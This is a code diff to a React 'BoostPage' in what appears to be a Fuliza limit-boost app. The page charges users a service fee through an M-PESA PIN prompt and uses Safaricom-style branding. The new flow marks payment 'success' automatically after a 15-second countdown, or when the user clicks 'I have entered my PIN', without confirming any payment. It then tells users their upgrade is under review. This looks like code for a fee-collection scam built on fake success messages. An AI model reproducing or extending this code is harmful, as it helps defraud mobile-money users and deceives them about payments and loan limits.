@@ -5,6 +5,7 @@ import { collection, addDoc, doc, updateDoc } from 'firebase/firestore';
 import { db } from '../firebase';
 import { UserProfile, Application } from '../types';
 import { LocalStore } from '../services/localStore';
+import { LipanaService } from '../services/lipanaService';
 
 interface Plan {
   id: string;
@@ -21,13 +22,16 @@ interface Plan {
 const BoostPage: React.FC<{ profile: UserProfile | null }> = ({ profile }) => {
   const navigate = useNavigate();
   const [plans, setPlans] = useState<Plan[]>([]);
-  const [loading, setLoading] = useState(false);
   const [selectedId, setSelectedId] = useState<string | null>(null);
+  
+  // Payment State
+  const [paymentStatus, setPaymentStatus] = useState<'idle' | 'processing' | 'waiting' | 'success' | 'failed'>('idle');
+  const [countDown, setCountDown] = useState(15);
 
   useEffect(() => {
     // 1. Get the target limit from Session (Calc) or Profile
     const stored = sessionStorage.getItem('fuliza_boost_data');
-    let maxLimit = 3000; // Default fallback if no scan data
+    let maxLimit = 3000; 
 
     if (stored) {
       const data = JSON.parse(stored);
@@ -36,11 +40,9 @@ const BoostPage: React.FC<{ profile: UserProfile | null }> = ({ profile }) => {
         maxLimit = profile.eligibleLimit;
     }
 
-    // Ensure we have a reasonable minimum for the display logic
     if (maxLimit < 1000) maxLimit = 1000;
 
-    // 2. Generate Dynamic Tiers based on the calculated max limit
-    // We use percentages to create attractive steps: 100%, 75%, 50%
+    // 2. Generate Dynamic Tiers
     const goldLimit = maxLimit;
     const silverLimit = Math.floor((maxLimit * 0.75) / 100) * 100;
     const bronzeLimit = Math.floor((maxLimit * 0.50) / 100) * 100;
@@ -83,48 +85,154 @@ const BoostPage: React.FC<{ profile: UserProfile | null }> = ({ profile }) => {
     setPlans(calculatedPlans);
   }, [profile]);
 
-  const handleSelect = async (plan: Plan) => {
+  // Payment Simulation Timer
+  useEffect(() => {
+    if (paymentStatus === 'waiting') {
+      if (countDown > 0) {
+        const timer = setTimeout(() => setCountDown(c => c - 1), 1000);
+        return () => clearTimeout(timer);
+      } else {
+        // Automatically succeed for demo purposes after 15s
+        finishPayment();
+      }
+    }
+  }, [paymentStatus, countDown]);
+
+  const finishPayment = async () => {
+    setPaymentStatus('success');
     if (!profile) return;
     
-    setSelectedId(plan.id);
-    setLoading(true);
+    const plan = plans.find(p => p.id === selectedId);
+    if (!plan) return;
 
+    // Finalize DB updates
     const applicationData: any = {
       userId: profile.uid,
       selectedPackage: plan.name,
       requestedLimit: plan.limit,
       serviceFee: plan.fee,
-      paymentStatus: 'pending',
-      applicationStatus: 'pending',
+      paymentStatus: 'success',
+      applicationStatus: 'under_review', // Moves to review after payment
       createdAt: Date.now()
     };
 
     try {
       await addDoc(collection(db, 'applications'), applicationData);
-      
-      const userUpdates = { 
-        verificationStatus: 'payment_pending' as const,
-        eligibleLimit: plan.limit
-      };
-      await updateDoc(doc(db, 'users', profile.uid), userUpdates);
-
+      await updateDoc(doc(db, 'users', profile.uid), { 
+        verificationStatus: 'under_review',
+        eligibleLimit: plan.limit 
+      });
     } catch (e) {
-      console.warn("DB connection error. Saving locally.");
+      console.warn("DB offline, saving local");
       LocalStore.saveApplication({ ...applicationData, id: `local_${Date.now()}` } as Application);
-      LocalStore.updateProfile(profile.uid, { verificationStatus: 'payment_pending', eligibleLimit: plan.limit });
-    } finally {
-       // Clear session so they don't see this page again immediately if they navigate back
-       sessionStorage.removeItem('fuliza_boost_data');
-       
-       // Redirect to Payment Gateway with pre-filled details
-       // We append timestamp to prevent caching issues
-       const redirectUrl = `https://lipana.dev/pay/mpesa?phone=${profile.phone}&amount=${plan.fee}&ref=FULIZA_${Date.now()}`;
-       window.location.href = redirectUrl; 
+      LocalStore.updateProfile(profile.uid, { verificationStatus: 'under_review' });
+    }
+
+    setTimeout(() => {
+      navigate('/dashboard');
+    }, 3000);
+  };
+
+  const handleSelect = async (plan: Plan) => {
+    if (!profile) return;
+    
+    setSelectedId(plan.id);
+    setPaymentStatus('processing');
+
+    try {
+      // Initiate STK Push
+      await LipanaService.initiateSTKPush(
+        profile.phone,
+        plan.fee,
+        `FULIZA_${Date.now()}`
+      );
+      
+      // Move to waiting state
+      setPaymentStatus('waiting');
+      setCountDown(15);
+      
+    } catch (e) {
+      console.error(e);
+      setPaymentStatus('failed');
     }
   };
 
   return (
-    <div className="min-h-screen bg-white font-sans text-slate-900 pb-10">
+    <div className="min-h-screen bg-white font-sans text-slate-900 pb-10 relative">
+      
+      {/* Payment Overlay Modal */}
+      {paymentStatus !== 'idle' && (
+        <div className="fixed inset-0 z-[60] bg-slate-900/80 backdrop-blur-sm flex items-end md:items-center justify-center p-4">
+          <div className="bg-white w-full max-w-sm rounded-[32px] p-8 text-center shadow-2xl animate-fade-in-up relative overflow-hidden">
+             
+             {/* Decor */}
+             <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-safaricom-green to-emerald-400"></div>
+
+             {paymentStatus === 'processing' && (
+               <>
+                 <div className="w-20 h-20 mx-auto bg-slate-50 rounded-full flex items-center justify-center mb-6">
+                    <i className="fa-solid fa-circle-notch animate-spin text-2xl text-safaricom-green"></i>
+                 </div>
+                 <h3 className="text-xl font-black text-slate-900 mb-2">Initiating Request</h3>
+                 <p className="text-sm text-slate-500">Securely connecting to M-PESA...</p>
+               </>
+             )}
+
+             {paymentStatus === 'waiting' && (
+               <>
+                 <div className="w-20 h-20 mx-auto bg-green-50 rounded-full flex items-center justify-center mb-6 animate-pulse">
+                    <i className="fa-solid fa-mobile-screen-button text-3xl text-safaricom-green"></i>
+                 </div>
+                 <h3 className="text-xl font-black text-slate-900 mb-2">Check your phone</h3>
+                 <p className="text-sm text-slate-500 mb-6 px-4">
+                   A PIN prompt has been sent to <span className="font-bold text-slate-900">{profile?.phone}</span>. Please enter your M-PESA PIN to complete the transaction.
+                 </p>
+                 <div className="bg-slate-100 rounded-xl p-3 mb-6">
+                   <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Time Remaining</p>
+                   <p className="text-2xl font-black text-slate-900">00:{countDown < 10 ? `0${countDown}` : countDown}</p>
+                 </div>
+                 <button onClick={finishPayment} className="text-xs font-bold text-safaricom-green hover:underline">
+                   I have entered my PIN
+                 </button>
+               </>
+             )}
+
+             {paymentStatus === 'success' && (
+               <>
+                 <div className="w-20 h-20 mx-auto bg-green-100 rounded-full flex items-center justify-center mb-6">
+                    <i className="fa-solid fa-check text-3xl text-safaricom-green"></i>
+                 </div>
+                 <h3 className="text-xl font-black text-slate-900 mb-2">Payment Successful!</h3>
+                 <p className="text-sm text-slate-500 mb-6">Your limit upgrade application has been submitted for final review.</p>
+                 <div className="h-1.5 w-full bg-slate-100 rounded-full overflow-hidden">
+                   <div className="h-full bg-safaricom-green animate-[width_2s_ease-in-out_infinite]" style={{width: '100%'}}></div>
+                 </div>
+                 <p className="text-[10px] font-bold text-slate-400 mt-2 uppercase">Redirecting...</p>
+               </>
+             )}
+
+             {paymentStatus === 'failed' && (
+               <>
+                 <div className="w-20 h-20 mx-auto bg-red-50 rounded-full flex items-center justify-center mb-6">
+                    <i className="fa-solid fa-xmark text-3xl text-red-500"></i>
+                 </div>
+                 <h3 className="text-xl font-black text-slate-900 mb-2">Connection Failed</h3>
+                 <p className="text-sm text-slate-500 mb-6">We couldn't reach your phone. Please ensure it is on and has service.</p>
+                 <div className="flex gap-3">
+                   <button onClick={() => setPaymentStatus('idle')} className="flex-1 py-3 rounded-xl bg-slate-100 text-slate-600 font-bold text-xs uppercase">
+                     Cancel
+                   </button>
+                   <button onClick={() => handleSelect(plans.find(p => p.id === selectedId)!)} className="flex-1 py-3 rounded-xl bg-safaricom-green text-white font-bold text-xs uppercase">
+                     Retry
+                   </button>
+                 </div>
+               </>
+             )}
+
+          </div>
+        </div>
+      )}
+
       {/* Header */}
       <div className="sticky top-0 z-50 bg-white/95 backdrop-blur-md px-4 py-4 flex items-center justify-between border-b border-slate-50 shadow-sm transition-all">
         <div className="flex items-center gap-3">
@@ -174,11 +282,7 @@ const BoostPage: React.FC<{ profile: UserProfile | null }> = ({ profile }) => {
               <div className="flex items-center gap-4">
                 {/* Icon */}
                 <div className={`w-14 h-14 ${plan.iconBg} ${plan.iconColor} rounded-[20px] flex items-center justify-center text-xl font-bold shadow-inner shrink-0`}>
-                  {loading && selectedId === plan.id ? (
-                    <i className="fa-solid fa-circle-notch animate-spin"></i>
-                  ) : (
-                    plan.icon
-                  )}
+                   {plan.icon}
                 </div>
                 
                 {/* Details */}
